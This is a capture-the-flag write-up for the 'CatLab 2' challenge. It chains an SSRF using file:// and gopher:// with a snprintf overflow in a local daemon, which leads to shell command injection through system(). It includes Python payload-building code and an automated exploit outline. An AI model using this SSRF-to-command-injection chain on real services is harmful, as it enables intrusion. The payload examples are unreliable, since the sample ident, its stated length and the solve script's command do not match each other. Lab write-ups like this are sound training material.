# CatLab 2

## Write-up

This challenge builds directly on CatLab 1. The web application's SSRF primitive is the entry point, but the flag now lives behind a separate binary service running on the same host.

---

### Step 1 — Discovering the Hidden Service

The challenge description points to `/entrypoint.sh`. Reading it via the `file://` SSRF reveals:

```sh
socat TCP-LISTEN:1337,fork,bind=127.0.0.1,reuseaddr EXEC:/opt/biosynth/biosynthd,...
```

A daemon called `biosynthd` is listening on port 1337 on localhost.

---

### Step 2 — Reversing the Binary

The binary can be extracted from the container using the `file://` SSRF as well.

Opening it in a disassembler reveals a custom binary protocol called **BSF (BioSynth Format)**:

| Offset | Size | Field      |
|--------|------|------------|
| 0      | 4    | Magic: `BSF\x01` |
| 4      | 1    | `ident_len` |
| 5      | 1    | `data_len`  |
| 6      | ident_len | Specimen identifier |
| 6+ident_len | data_len | Payload data |

The daemon reads a packet, XOR-transforms the data field with `0x42`, writes the result to a temporary file, and then cleans up old results using `find`.

---

### Step 3 — Finding the Vulnerability

Two adjacent static buffers live in the `.data` segment:

```c
static char outpath[32]   = "/tmp/result_.bsf";
static char find_args[64] = "-name 'result_*.bsf' -mmin +15 -delete";
```

The output path is constructed with:

```c
snprintf(outpath, sizeof(outpath) + hdr->ident_len,
         "/tmp/result_%.*s.bsf", (int)hdr->ident_len, ident_ptr);
```

The size argument is `32 + ident_len`. Therefore, with a large enough `ident_len`, `snprintf` is allowed to write past the end of `outpath` and directly into `find_args`.

Later, the `save` function calls:

```c
snprintf(cmd, sizeof(cmd), "find /tmp %s", find_args);
system(cmd);
```

If we control `find_args`, we control the shell command.

---

### Step 4 — Crafting the Payload

`outpath` is 32 bytes. The prefix `/tmp/result_` is 12 bytes, so the ident starts at byte 12 inside the buffer. To reach `find_args[0]` we need 20 bytes of filler after the prefix, meaning an ident of length **20 bytes of filler + injection string**.

The injected string is placed so that `find_args` becomes:

```
; <COMMAND> #<original args>
```

Example ident (38 bytes):

```
AAAAAAAAAAAAAAAAAAAA; /home/biosynth/*.txt #
```

The resulting `find_args` after the overflow:

```
; cat /home/biosynth/*.txt #name 'result_*.bsf' -mmin +15 -delete
```

The shell executes `find /tmp ; cat /home/biosynth/*.txt #...`, printing the flag to stdout, which socat relays back to us.

The BSF packet is assembled as:

```python
MAGIC = b"BSF\x01"
ident = b"A" * 20 + b"; cat /home/biosynth/*.txt #"
data  = b"A"   # non-empty to pass the header check
header = MAGIC + bytes([len(ident), len(data)])
bsf = header + ident + data
```

---

### Step 5 — Delivering the Payload via SSRF + Gopher

The SSRF endpoint in CatLab 1 uses `curl`, which supports the `gopher://` scheme. Gopher lets us send arbitrary bytes to a TCP port, making it ideal for binary protocols.

```python
def gopher_encode(host, port, data):
    encoded = urllib.parse.quote(data, safe="")
    return f"gopher://{host}:{port}/_{encoded}"

url = gopher_encode("127.0.0.1", 1337, bsf)
```

We first obtain an admin session (via the md5 refresh-token trick from CatLab 1), then POST the gopher URL to `/experiment.php`. The server-side `curl` call connects to port 1337, sends our BSF packet, and the response is returned in the page.

---

### Automated Exploit

See [solve.py](solve.py) for the full automated exploit. It:

1. Computes `md5('admin')` and calls `/refresh.php` to get an admin `access_token`.
2. Builds a BSF packet whose ident overflows `outpath` into `find_args` with `; cat /flag #`.
3. Encodes it as a `gopher://` URL and sends it via the SSRF on `/experiment.php`.
4. Parses and prints the flag from the response.

```
$ python3 solve.py
[*] [+] Admin session obtained
[*] [+] Sending gopher payload (55 bytes)
[*] [+] Response: ...polycyber{7h3_s3cr37_ingr3di3n7_is_plu70nium}
```

---

## Flag

`polycyber{7h3_s3cr37_ingr3di3n7_is_plu70nium}`
